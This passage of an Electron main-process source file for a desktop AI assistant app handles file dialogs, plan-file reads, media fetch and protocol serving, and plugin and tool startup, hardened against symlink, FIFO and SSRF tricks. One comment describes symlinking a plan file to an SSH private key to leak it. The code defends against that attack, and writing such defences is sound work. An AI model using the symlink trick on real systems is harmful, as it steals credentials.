      if (!win) return;
      if (IS_MAC) {
        // Respect the user's macOS System Preferences for "Double-click a window's title bar to"
        // which can be "Zoom" (maximize) or "Minimize"
        const action = systemPreferences.getUserDefault('AppleActionOnDoubleClick', 'string');
        if (action === 'Minimize') {
          win.minimize();
        } else {
          // Default is "Zoom" (or "Fill" on newer macOS) — toggle maximize
          if (win.isMaximized()) {
            win.unmaximize();
          } else {
            win.maximize();
          }
        }
      } else {
        // Windows/Linux: toggle maximize on double-click
        if (win.isMaximized()) {
          win.unmaximize();
        } else {
          win.maximize();
        }
      }
    });

    // File dialog handler
    ipcMain.handle(
      'dialog:open-file',
      async (_event, options?: { filters?: Array<{ name: string; extensions: string[] }> }) => {
        const win = BrowserWindow.getFocusedWindow();
        if (!win) return { canceled: true, filePaths: [] };
        const result = await dialog.showOpenDialog(win, {
          properties: ['openFile', 'multiSelections'],
          filters: options?.filters ?? [
            { name: 'All Files', extensions: ['*'] },
            { name: 'Images', extensions: ['png', 'jpg', 'jpeg', 'gif', 'webp', 'svg'] },
            { name: 'Documents', extensions: ['pdf', 'txt', 'md', 'json', 'csv'] },
          ],
        });
        if (result.canceled) return { canceled: true, filePaths: [] };

        // Read files and return as base64 data URLs. Enforce per-file + aggregate byte caps (R181),
        // and open each file with O_NOFOLLOW + fstat the fd (R182): a plain statSync FOLLOWS a symlink
        // and never checks the file TYPE, so a selected symlink to /dev/zero or a FIFO reports size 0,
        // passes the cap, and then readFileSync either OOMs or blocks main forever. Open first (no
        // link-follow), then fstat the real fd for both type (regular file) and size before reading.
        const MAX_ATTACHMENT_BYTES = 64 * 1024 * 1024; // per file
        const MAX_ATTACHMENT_TOTAL_BYTES = 256 * 1024 * 1024; // across the selection
        const skipped: string[] = [];
        let aggregateBytes = 0;
        const files: Array<Record<string, unknown>> = [];
        for (const filePath of result.filePaths) {
          let fd: number;
          try {
            // O_NONBLOCK (R183): opening a FIFO with a plain blocking O_RDONLY would hang main in the
            // openSync call itself — before fstat could reject it. Open nonblocking; a regular file is
            // unaffected, and a FIFO/device is rejected by the isFile() check below.
            fd = openSync(filePath, fsReadConstants.O_RDONLY | fsReadConstants.O_NOFOLLOW | fsReadConstants.O_NONBLOCK);
          } catch {
            skipped.push(basename(filePath));
            continue;
          }
          let data: Buffer;
          try {
            const st = fstatSync(fd);
            // Reject non-regular files (FIFO/device/socket/dir): their reported size is meaningless and
            // reading can block main indefinitely or stream unbounded bytes.
            if (!st.isFile()) {
              skipped.push(basename(filePath));
              continue;
            }
            if (st.size > MAX_ATTACHMENT_BYTES || aggregateBytes + st.size > MAX_ATTACHMENT_TOTAL_BYTES) {
              skipped.push(basename(filePath));
              continue;
            }
            // Read at most the VALIDATED size (R184): readFileSync(fd) reads the file's CURRENT length,
            // so a regular file grown between fstat and read could exceed the caps. Allocate a buffer of
            // the fstat'd size and read exactly that many bytes — the allocation is bounded by the size
            // we already checked, and any bytes appended after fstat are simply not read.
            const buf = Buffer.allocUnsafe(st.size);
            let off = 0;
            while (off < st.size) {
              const n = readSync(fd, buf, off, st.size - off, off);
              if (n === 0) break; // truncated after fstat — use what we got
              off += n;
            }
            data = off === st.size ? buf : buf.subarray(0, off);
          } catch {
            skipped.push(basename(filePath));
            continue;
          } finally {
            closeSync(fd);
          }
          aggregateBytes += data.length;
          const ext = filePath.split('.').pop()?.toLowerCase() ?? '';
          const mimeTypes: Record<string, string> = {
            png: 'image/png',
            jpg: 'image/jpeg',
            jpeg: 'image/jpeg',
            gif: 'image/gif',
            webp: 'image/webp',
            svg: 'image/svg+xml',
            pdf: 'application/pdf',
            txt: 'text/plain',
            md: 'text/markdown',
            json: 'application/json',
            csv: 'text/csv',
          };
          const mime = mimeTypes[ext] ?? 'application/octet-stream';
          const isImage = mime.startsWith('image/');
          files.push({
            path: filePath,
            name: basename(filePath),
            mime,
            isImage,
            size: data.length,
            dataUrl: `data:${mime};base64,${data.toString('base64')}`,
            // For text files, also include raw text
            ...(mime.startsWith('text/') || mime === 'application/json' ? { text: data.toString('utf-8') } : {}),
          });
        }
        return { canceled: false, files, ...(skipped.length > 0 ? { skipped } : {}) };
      },
    );

    ipcMain.handle('dialog:open-directory', async () => {
      const win = BrowserWindow.getFocusedWindow();
      if (!win) return { canceled: true };
      const result = await dialog.showOpenDialog(win, {
        properties: ['openDirectory', 'createDirectory'],
      });
      if (result.canceled || result.filePaths.length === 0) return { canceled: true };

      const directoryPath = result.filePaths[0];
      return {
        canceled: false,
        directoryPath,
        name: basename(directoryPath),
      };
    });

    // Directory picker handler — walks directory recursively and returns all file paths
    ipcMain.handle('dialog:open-directory-files', async () => {
      const win = BrowserWindow.getFocusedWindow();
      if (!win) return { canceled: true, filePaths: [] };
      const result = await dialog.showOpenDialog(win, {
        properties: ['openDirectory'],
      });
      if (result.canceled || result.filePaths.length === 0) return { canceled: true, filePaths: [] };

      const dirPath = result.filePaths[0];
      const files: string[] = [];
      const walk = (dir: string): void => {
        for (const entry of readdirSync(dir, { withFileTypes: true })) {
          const full = join(dir, entry.name);
          if (entry.isDirectory()) {
            if (!entry.name.startsWith('.')) walk(full);
          } else {
            files.push(full);
          }
        }
      };
      walk(dirPath);
      return { canceled: false, filePaths: files };
    });

    // Combined file-OR-directory picker (File Access settings "Browse…").
    ipcMain.handle('dialog:open-path', async () => {
      const win = BrowserWindow.getFocusedWindow();
      if (!win) return { canceled: true };
      const result = await dialog.showOpenDialog(win, {
        properties: ['openFile', 'openDirectory'],
      });
      if (result.canceled || result.filePaths.length === 0) return { canceled: true };
      const picked = result.filePaths[0];
      let isDirectory = false;
      try {
        isDirectory = statSync(picked).isDirectory();
      } catch {
        /* best-effort */
      }
      return { canceled: false, path: picked, isDirectory, name: basename(picked) };
    });

    // File Access settings: preview what a candidate allow/deny entry matches.
    ipcMain.handle('fileAccess:preview-path', async (_event, entry: unknown) => {
      try {
        const { previewPathEntry } = await import('./tools/file-access.js');
        return previewPathEntry(typeof entry === 'string' ? entry : '', readEffectiveConfig(APP_HOME));
      } catch (err) {
        return { error: err instanceof Error ? err.message : String(err) };
      }
    });

    // List directory contents on the host (used by web UI directory browser)
    ipcMain.handle('fs:list-directory', (_event, dirPath: string) => {
      try {
        const resolved = dirPath === '~' ? homedir() : dirPath.replace(/^~\//, homedir() + '/');
        if (!existsSync(resolved) || !statSync(resolved).isDirectory()) {
          return { error: 'Not a directory', entries: [] };
        }
        // Cap the enumeration (R180/R182/R183): this web-bridge-reachable handler synchronously reads
        // + sorts entries of an arbitrary directory. A huge dir (e.g. /usr/bin, node_modules, or a dir
        // of millions of DOTFILES) would freeze main and produce an enormous response. Iterate with
        // opendirSync and STOP after scanning the cap — bound the SCAN (every Dirent examined), not just
        // the collected non-hidden entries, so a flood of hidden files can't keep the loop running.
        const MAX_DIR_ENTRIES = 5000;
        const collected: Array<{ name: string; isDirectory: boolean }> = [];
        let truncated = false;
        let scanned = 0;
        const dir = opendirSync(resolved);
        try {
          let dirent = dir.readSync();
          while (dirent !== null) {
            if (scanned >= MAX_DIR_ENTRIES) {
              truncated = true;
              break;
            }
            scanned++;
            if (!dirent.name.startsWith('.')) {
              collected.push({ name: dirent.name, isDirectory: dirent.isDirectory() });
            }
            dirent = dir.readSync();
          }
        } finally {
          dir.closeSync();
        }
        const entries = collected.sort((a, b) => {
          if (a.isDirectory !== b.isDirectory) return a.isDirectory ? -1 : 1;
          return a.name.localeCompare(b.name);
        });
        return { path: resolved, entries, ...(truncated ? { truncated: true } : {}) };
      } catch (err) {
        return { error: String(err), entries: [] };
      }
    });

    // Read a plan file from ~/.kai/plans/ (for the plan side panel)
    ipcMain.handle('plans:read-file', (_event, filename: string) => {
      try {
        const plansDir = join(homedir(), '.kai', 'plans');
        // Security: strip directory components and only allow reading from the plans directory
        const safeName = String(filename).replace(/[/\\]/g, '');
        const resolved = join(plansDir, safeName);
        // Use lstatSync (NOT statSync) so a SYMLINK at the target is detected and REJECTED rather
        // than followed (R168): statSync follows the link, so `~/.kai/plans/x.md → ~/.ssh/id_ed25519`
        // would leak the target's contents through this IPC channel. Plan files are ephemeral
        // Byte cap (R180) + single-descriptor validation (R204): a pre-open lstat cap is a TOCTOU — a
        // regular file grown/replaced between the lstat and the read could exceed the cap, and a FIFO swap
        // could block a plain openSync. Open FIRST with O_NOFOLLOW|O_NONBLOCK (nonblocking so a FIFO can't
        // hang the open), then fstat the SAME descriptor to confirm a regular file + enforce the cap, and
        // read exactly the fstat'd size with a bounded loop (bytes appended after fstat are not read).
        const MAX_PLAN_READ_BYTES = 4 * 1024 * 1024;
        let fd: number;
        try {
          fd = openSync(resolved, fsReadConstants.O_RDONLY | fsReadConstants.O_NOFOLLOW | fsReadConstants.O_NONBLOCK);
        } catch {
          return { error: 'File not found' };
        }
        try {
          const st = fstatSync(fd);
          if (!st.isFile()) {
            return { error: 'File not found' };
          }
          if (st.size > MAX_PLAN_READ_BYTES) {
            return { error: 'Plan file too large' };
          }
          const buf = Buffer.allocUnsafe(st.size);
          let off = 0;
          while (off < st.size) {
            const n = readSync(fd, buf, off, st.size - off, off);
            if (n === 0) break; // truncated after fstat — use what we got
            off += n;
          }
          return { content: buf.subarray(0, off).toString('utf-8') };
        } finally {
          closeSync(fd);
        }
      } catch (err) {
        return { error: String(err) };
      }
    });

    // Fetch image bytes from main process (bypasses CORS)
    // Cap on a media fetch/save so a huge/endless remote response can't OOM the
    // main process (the fetched bytes are also base64'd for IPC on the fetch path).
    const MAX_MEDIA_FETCH_BYTES = 256 * 1024 * 1024; // 256 MiB
    ipcMain.handle('image:fetch', async (_event, url: string) => {
      let parsed;
      try {
        parsed = new URL(url);
      } catch {
        return { error: 'Invalid URL' };
      }
      if (
        parsed.protocol !== 'http:' &&
        parsed.protocol !== 'https:' &&
        parsed.protocol !== __BRAND_MEDIA_PROTOCOL + ':'
      ) {
        return { error: 'Only http(s) and media URLs are allowed' };
      }
      try {
        const isMedia = parsed.protocol === __BRAND_MEDIA_PROTOCOL + ':';
        // http(s) URLs go through the SSRF-guarded fetch (blocks private/loopback
        // targets + redirect bypass + caps the body). The media: protocol resolves
        // to a LOCAL file via the app's own protocol handler — not a network
        // request — so it uses net.fetch directly and needs no SSRF guard.
        const resp = isMedia
          ? await net.fetch(url, { headers: withBrandUserAgent() })
          : await safeFetch(url, { headers: withBrandUserAgent() as Record<string, string> });
        if (!resp.ok) return { error: `HTTP ${resp.status}` };
        const buffer = isMedia
          ? Buffer.from(await resp.arrayBuffer())
          : await readCappedArrayBuffer(resp, MAX_MEDIA_FETCH_BYTES);
        const mime = resp.headers.get('content-type') || 'image/png';
        return { data: buffer.toString('base64'), mime };
      } catch (err) {
        return { error: String(err) };
      }
    });

    // Save media (image/video/audio) to disk via native save dialog
    ipcMain.handle('image:save', async (_event, url: string, suggestedName?: string) => {
      const win = BrowserWindow.getFocusedWindow();
      if (!win) return { canceled: true };

      let parsed;
      try {
        parsed = new URL(url);
      } catch {
        return { error: 'Invalid URL' };
      }
      if (
        parsed.protocol !== 'http:' &&
        parsed.protocol !== 'https:' &&
        parsed.protocol !== __BRAND_MEDIA_PROTOCOL + ':'
      ) {
        return { error: 'Only http(s) and media URLs are allowed' };
      }

      const ext = (suggestedName?.split('.').pop() ?? 'png').toLowerCase();

      // Determine file type filters based on extension
      const imageExts = ['png', 'jpg', 'jpeg', 'gif', 'webp', 'svg'];
      const videoExts = ['mp4', 'webm', 'mov'];
      const audioExts = ['mp3', 'wav', 'flac', 'opus', 'ogg', 'aac'];

      let filters: Array<{ name: string; extensions: string[] }>;
      let defaultName: string;
      if (videoExts.includes(ext)) {
        filters = [
          { name: 'Videos', extensions: [ext, ...videoExts.filter((e) => e !== ext)] },
          { name: 'All Files', extensions: ['*'] },
        ];
        defaultName = suggestedName || `video.${ext}`;
      } else if (audioExts.includes(ext)) {
        filters = [
          { name: 'Audio', extensions: [ext, ...audioExts.filter((e) => e !== ext)] },
          { name: 'All Files', extensions: ['*'] },
        ];
        defaultName = suggestedName || `audio.${ext}`;
      } else {
        filters = [
          { name: 'Images', extensions: [ext, ...imageExts.filter((e) => e !== ext)] },
          { name: 'All Files', extensions: ['*'] },
        ];
        defaultName = suggestedName || 'image.png';
      }

      const result = await dialog.showSaveDialog(win, {
        defaultPath: defaultName,
        filters,
      });
      if (result.canceled || !result.filePath) return { canceled: true };

      try {
        const isMedia = parsed.protocol === __BRAND_MEDIA_PROTOCOL + ':';
        const resp = isMedia
          ? await net.fetch(url, { headers: withBrandUserAgent() })
          : await safeFetch(url, { headers: withBrandUserAgent() as Record<string, string> });
        if (!resp.ok) return { error: `HTTP ${resp.status}` };
        const buffer = isMedia
          ? Buffer.from(await resp.arrayBuffer())
          : await readCappedArrayBuffer(resp, MAX_MEDIA_FETCH_BYTES);
        writeFileSync(result.filePath, buffer);
        return { canceled: false, filePath: result.filePath };
      } catch (err) {
        return { error: String(err) };
      }
    });

    // Register media protocol to serve generated media files from disk
    // This avoids CSP/file:// restrictions in the renderer
    const mediaDir = join(APP_HOME, 'media');
    protocol.handle(__BRAND_MEDIA_PROTOCOL, (request) => {
      // URL format: <protocol>://images/filename.png or <protocol>://videos/filename.mp4
      // Strip query string (e.g. cache-busters like ?_r=1) before resolving the file path
      const rawPath = request.url.replace(__BRAND_MEDIA_PROTOCOL + '://', '').split('?')[0];
      const urlPath = decodeURIComponent(rawPath);
      const filePath = join(mediaDir, urlPath);

      // Security: lexical containment first, then a symlink/TOCTOU-safe read
      // (realpath re-check + O_NOFOLLOW fd) so a symlink planted inside mediaDir
      // can't turn this handler into a main-process file-read oracle.
      if (!filePath.startsWith(mediaDir + sep) && filePath !== mediaDir) {
        return new Response('Forbidden', { status: 403 });
      }

      const ext = filePath.split('.').pop()?.toLowerCase() ?? '';
      const mimeTypes: Record<string, string> = {
        png: 'image/png',
        jpg: 'image/jpeg',
        jpeg: 'image/jpeg',
        webp: 'image/webp',
        gif: 'image/gif',
        mp4: 'video/mp4',
        webm: 'video/webm',
        mov: 'video/quicktime',
        mp3: 'audio/mpeg',
        wav: 'audio/wav',
        flac: 'audio/flac',
        opus: 'audio/opus',
        ogg: 'audio/ogg',
      };
      const contentType = mimeTypes[ext] || 'application/octet-stream';

      // Honor a Range request (R171) so a media element (esp. <video preload="metadata">) can fetch
      // just the bytes it needs instead of making us buffer the WHOLE file (up to 512MiB) into memory.
      // Parse a single `bytes=start-end` range; multi-range is uncommon for media and we fall back to
      // a full read for it.
      const rangeHeader = request.headers.get('Range') || request.headers.get('range');
      const singleRange = rangeHeader ? /^bytes=(\d*)-(\d*)$/.exec(rangeHeader.trim()) : null;
      if (singleRange) {
        // Need the size first; do a bounded ranged read starting at the requested offset.
        const startStr = singleRange[1];
        const endStr = singleRange[2];
        // Suffix range (bytes=-N) → last N bytes; needs the size, so read once to learn it via a
        // best-effort full-containment stat. We resolve start/end after a small probe read.
        const MEDIA_CHUNK = 4 * 1024 * 1024; // serve at most 4MiB per range response
        let start: number;
        let end: number;
        if (startStr === '' && endStr !== '') {
          // suffix range — resolve against size from a 1-byte probe (cheap) to get total length
          const probe = safeReadRangeWithin(mediaDir, filePath, 0, 0);
          if (!probe) return new Response('Not Found', { status: 404 });
          const suffix = Math.min(parseInt(endStr, 10), probe.size);
          start = Math.max(0, probe.size - suffix);
          // Cap the served span to MEDIA_CHUNK (R172): an open-ended suffix like bytes=-536870912
          // would otherwise buffer the whole (up to 512MiB) file. The client re-requests further
          // bytes with follow-up ranges.
          end = Math.min(probe.size - 1, start + MEDIA_CHUNK - 1);
        } else {
          start = startStr === '' ? 0 : parseInt(startStr, 10);
          end = endStr === '' ? start + MEDIA_CHUNK - 1 : parseInt(endStr, 10);
          // Cap the served span so a `bytes=0-` request doesn't buffer the whole file.
          end = Math.min(end, start + MEDIA_CHUNK - 1);
        }
        const ranged = safeReadRangeWithin(mediaDir, filePath, start, end);
        if (!ranged) {
          // Unsatisfiable / not found — probe existence to choose 416 vs 404.
          const exists = safeReadRangeWithin(mediaDir, filePath, 0, 0);
          if (exists) {
            return new Response('Range Not Satisfiable', {
              status: 416,
              headers: { 'Content-Range': `bytes */${exists.size}` },
            });
          }
          return new Response('Not Found', { status: 404 });
        }
        return new Response(new Uint8Array(ranged.data), {
          status: 206,
          headers: {
            'Content-Type': contentType,
            'Content-Range': `bytes ${ranged.start}-${ranged.end}/${ranged.size}`,
            'Accept-Ranges': 'bytes',
            'Content-Length': String(ranged.data.length),
            'Cache-Control': 'no-cache',
          },
        });
      }

      // A Range header that is PRESENT but not a parseable single range (multi-range, or malformed)
      // must NOT fall through to the unbounded full-file read (R172) — a `bytes=-BIG` or multi-range
      // against a 512MiB video would allocate the whole file. Serve a bounded first chunk as 206.
      if (rangeHeader) {
        const ranged = safeReadRangeWithin(mediaDir, filePath, 0, 4 * 1024 * 1024 - 1);
        if (ranged) {
          return new Response(new Uint8Array(ranged.data), {
            status: 206,
            headers: {
              'Content-Type': contentType,
              'Content-Range': `bytes ${ranged.start}-${ranged.end}/${ranged.size}`,
              'Accept-Ranges': 'bytes',
              'Content-Length': String(ranged.data.length),
              'Cache-Control': 'no-cache',
            },
          });
        }
        // fall through to full read only if the ranged read failed (e.g. empty file)
      }

      const data = safeReadFileWithin(mediaDir, filePath);
      if (!data) {
        return new Response('Not Found', { status: 404 });
      }
      return new Response(new Uint8Array(data), {
        headers: { 'Content-Type': contentType, 'Accept-Ranges': 'bytes', 'Cache-Control': 'no-cache' },
      });
    });

    protocol.handle(PLUGIN_RENDERER_PROTOCOL, (request) => {
      if (!pluginManagerRef) {
        return new Response('Plugin manager not ready', { status: 503 });
      }

      let parsed: URL;
      try {
        parsed = new URL(request.url);
      } catch {
        return new Response('Bad Request', { status: 400 });
      }

      // URL format: plugin-renderer://pluginName/assetPath
      const pluginName = decodeURIComponent(parsed.hostname);
      const assetPath = parsed.pathname.split('/').filter(Boolean).map(decodeURIComponent).join('/');

      if (!pluginName || !assetPath) {
        return new Response('Bad Request', { status: 400 });
      }

      const resolved = pluginManagerRef.resolveRendererAssetRequest(pluginName, assetPath);
      if (!resolved) {
        return new Response('Not Found', { status: 404 });
      }

      return new Response(new Uint8Array(resolved.data), {
        headers: {
          'Content-Type': resolved.contentType,
          'Cache-Control': 'no-cache',
        },
      });
    });

    const mainWindow = IS_HEADLESS ? null : createWindow();

    // Initialize marketplace and plugins immediately. We avoid putting this
    // inside `ready-to-show` because createWindow() calls loadURL(), which may
    // fire the event before any handler registered here can observe it.
    const pluginsReady = (async () => {
      try {
        // Initialize marketplace and auto-install required plugins before loading.
        // Always call initMarketplace (even with no URLs) so it can flip the
        // "marketplace ready" flag and broadcast — the renderer waits on that to
        // avoid a false "No marketplace configured" during the async fetch.
        const marketplaceUrls = getBrandMarketplaceUrls();
        try {
          await pluginManager.initMarketplace(marketplaceUrls);
        } catch (err) {
          console.warn(`[${__BRAND_PRODUCT_NAME}] Marketplace init failed (non-fatal):`, err);
        }

        await pluginManager.loadAll();
        console.info(`[${__BRAND_PRODUCT_NAME}] ${pluginManager.getPluginCount()} plugins loaded`);

        // Start periodic marketplace catalog refresh for plugin update detection
        pluginManager.startCatalogRefresh();

        // If this launch follows a successful update, fire post-update hooks
        // (e.g., revoke admin privileges granted by pre-update hook).
        const updateMarker = consumePostUpdateMarker();
        // This process IS the current version; any update-ready signal is now
        // satisfied (or stale) — clear it so a fresh leader isn't told to step
        // aside for an update it already IS.
        clearUpdateReady();
        if (updateMarker) {
          // Only report success if the app actually relaunched into the marker's
          // target version. A failed/rolled-back Squirrel install can leave a
          // stale marker; firing success post-hooks (e.g. revoking admin) for a
          // version we're not running would be wrong.
          const updateSucceeded = updateMarker.version === app.getVersion();
          console.info(
            `[${__BRAND_PRODUCT_NAME}] Post-update: ${updateMarker.fromVersion} → ${updateMarker.version} ` +
              `(running ${app.getVersion()}, success=${updateSucceeded})`,
          );
          pluginManager
            .runPostUpdateHooks({
              version: updateMarker.version,
              success: updateSucceeded,
            })
            .catch((err) => {
              console.error(`[${__BRAND_PRODUCT_NAME}] Post-update hooks after relaunch threw:`, err);
            });
        }
      } catch (err) {
        console.error(`[${__BRAND_PRODUCT_NAME}] Plugin loading failed:`, err);
      }
    })();

    mainWindow?.once('ready-to-show', () => {
      mainWindow.show();

      // Signal OTA rollback system that the app is running stably
      signalAppRunning(__BRAND_APP_SLUG, codePaths.codeVersion);
    });

    // Headless leader has no window to become "ready to show" — signal stable
    // once the backend is up so OTA rollback doesn't count it as a crash.
    if (IS_HEADLESS) {
      signalAppRunning(__BRAND_APP_SLUG, codePaths.codeVersion);
    }

    // Initialize tools asynchronously
    const toolsReady = shellPathReady
      .then(() => buildToolRegistry(getConfig, APP_HOME, pluginManager))
      .then((tools) => {
        const pluginTools = pluginManager.getAllPluginTools();
        const allTools = [...tools, ...pluginTools];
        // Browser tools are hot-swapped as soon as the primary window/config
        // changes. MCP startup can take long enough for that state to change;
        // do not let this older registry snapshot overwrite the live setting.
        registerToolsPreservingBrowserState(allTools);
        console.info(`[${__BRAND_PRODUCT_NAME}] ${tools.length} tools + ${pluginTools.length} plugin tools registered`);
        // The initial registry is now live. Enable hot-reloads and re-run once if any config change
        // arrived DURING the build (R170 f-5), so it lands ON TOP of this registration.
        initialToolsRegistered = true;
        if (configChangedDuringStartup) {
          configChangedDuringStartup = false;
          try {
            handleConfigChanged(getConfig());
          } catch (err) {
            console.error(`[${__BRAND_PRODUCT_NAME}] deferred config hot-reload failed:`, err);
          }
        }

        // Register realtime handlers (needs tool registry)
        registerRealtimeHandlers(
          ipcMain,
          getConfig,
          getRegisteredTools,
          APP_HOME,
          () => primaryWindowRef,
          isTextConversationTurnActive,
        );

        // Start web UI server if enabled — but NOT in headless (CLI-spawned)
        // mode. The web server is a GUI-app feature; a headless CLI backend
        // shouldn't expose a network port, and plugin/web bridge connections to
        // it would otherwise count as "clients" and suppress idle-shutdown.
        const webServerConfig = getConfig().webServer;
        if (webServerConfig?.enabled && !IS_HEADLESS) {
          startWebServer(webServerConfig)
            .then(() =>
              console.info(
                `[${__BRAND_PRODUCT_NAME}] Web UI server started on ${webServerConfig.tls?.enabled ? 'https' : 'http'}://${webServerConfig.bindAddress || '0.0.0.0'}:${webServerConfig.port}`,
              ),
            )
            .catch((err) => console.error(`[${__BRAND_PRODUCT_NAME}] Web server failed to start:`, err));
        }

        // Initialize subagent cleanup cron job
        const dbPath = join(APP_HOME, 'data', 'memory.db');
        initializeSubagentCleanup(getConfig, APP_HOME, dbPath);
      })
      .catch((err) => {
        console.error(`[${__BRAND_PRODUCT_NAME}] Failed to build tool registry:`, err);
        // Still resolve tools-ready (with whatever registered, possibly none) so
        // CLI agent:submit calls don't hang forever awaiting a registry that
        // will never arrive. registerTools() flips the ready latch.
        registerTools(getRegisteredTools());
        // Enable hot-reloads even on build failure (R171): otherwise a single initial-build rejection
        // would DEFER every config-driven MCP/skill/CLI reload forever (until restart). Re-run any
        // change that arrived during the (failed) build so config still takes effect live.
        initialToolsRegistered = true;
        if (configChangedDuringStartup) {
          configChangedDuringStartup = false;
          try {
            handleConfigChanged(getConfig());
          } catch (e) {
            console.error(`[${__BRAND_PRODUCT_NAME}] deferred config hot-reload failed:`, e);
          }
        }
      });

    void Promise.allSettled([pluginsReady, toolsReady, workspaceToolsReady]).then(() => {
      eventBus.emit('app', 'ready', {});
    });

    app.on('activate', () => {
      const allWindows = BrowserWindow.getAllWindows();
      if (allWindows.length === 0) {
        // If we're a dockless (headless/demoted) backend, go through the full
        // promotion (lift window block, restore dock/activation, init GUI subsystems,
        // disable idle-shutdown) — a raw createWindow() here would be destroyed by
        // the window block.
        if (headlessWindowBlockActive) {
          void promoteHeadlessToWindowed();
          return;
        }
        const win = createWindow();
        win.once('ready-to-show', () => {
          win.show();
        });
        return;
      }

      const preferred = lastFocusedWindowRef && !lastFocusedWindowRef.isDestroyed() ? lastFocusedWindowRef : null;
      if (preferred) {
        if (preferred.isMinimized()) preferred.restore();
        if (!preferred.isVisible()) preferred.show();
        preferred.focus();
        return;
      }

      focusPrimaryWindow();
    });
  });
} else if (IS_CLI) {
  // CLI client mode: no backend, no window, no lock. Run the Ink REPL in this
  // main process against the inherited terminal TTY, connecting to the backend
  // over the local socket (spawning a headless backend if none is running).
  app.whenReady().then(async () => {
    if (process.platform === 'darwin' && app.setActivationPolicy) {
      app.setActivationPolicy('prohibited'); // never dock / foreground the CLI process
    }
    try {
      const { runCliClient } = await import('./cli/electron-entry.js');
      await runCliClient();
    } catch (err) {
      process.stderr.write(`[kai] fatal: ${err instanceof Error ? err.message : String(err)}\n`);
      app.exit(1);
    }
  });
}

app.on('window-all-closed', () => {
  // If CLI/socket clients OR web-UI clients are still attached, don't quit —
  // the backend they depend on lives here. Revert to a dockless headless
  // background backend that idle-exits once the last client disconnects.
  if (localClients.size > 0 || webClients.size > 0) {
    demoteWindowedToHeadlessRef();
    return;
  }
  // No clients. A backend that only ever existed to serve clients (a headless
  // CLI-spawned leader, or a GUI that has since demoted) has no reason to
  // linger, so quit on every platform. But a NORMAL GUI launch must keep the
  // historical macOS behavior: stay resident (dock icon + main-process
  // background services — dictation/App Shots global hotkeys, automation
  // engine) and reopen on `activate`. Only non-darwin quits in that case.
  const isBackendOnly = IS_HEADLESS || headlessWindowBlockActive;
  if (isBackendOnly || process.platform !== 'darwin') {
    app.quit();
  }
});

app.on('before-quit', (event) => {
  // Browser profile metadata is intentionally written off the main thread.
  // Hold the first quit request long enough to drain those writes, then issue a
  // second quit that passes straight through. This also remains bounded by the
  // existing hard-exit fallbacks used by headless/update shutdown paths.
  if (!browserShutdownComplete) event.preventDefault();
  if (quitCleanupStarted) return;
  quitCleanupStarted = true;
  // Signal OTA rollback that this was a graceful quit (not a crash)
  signalGracefulQuit(__BRAND_APP_SLUG);
  cleanupOta();
  // Stop web UI server
  stopWebServer().catch(() => {});
  // Stop the local CLI bridge (Phase 5 will add graceful leader handoff here)
  stopLocalServer().catch(() => {});
  // Best-effort plugin cleanup (don't block quit on failures)
  pluginManagerRef?.unloadAll().catch((err) => {
    console.error(`[${__BRAND_PRODUCT_NAME}] Plugin cleanup error:`, err);
  });
  // Close MCP connections so stdio child processes / network handles don't
  // survive as orphans (a child is not killed automatically when Electron exits).
  disconnectAllMcpServers().catch(() => {});
  cleanupMicRecorder();
  cleanupDictation();
  cleanupAppShots();
  // Stop the computer-use takeover monitor's native helper child (not auto-killed on exit).
  getExistingComputerUseManager()?.dispose();
  closeAllOverlayWindows();
  closeAllApprovalWindows();
  taskTerminalManagerRef?.dispose();
  // Stop the off-thread tokenizer worker (harmless no-op if never spawned).
  terminateTokenizerWorker();
  flushOutputBuffers();
  taskDispatcherRef?.stop();
  void shutdownBrowserManager()
    .catch((error) => {
      console.warn(`[${__BRAND_PRODUCT_NAME}] Failed to flush Browser profile data during shutdown:`, error);
    })
    .finally(() => {
      browserShutdownComplete = true;
      app.quit();
    });
});
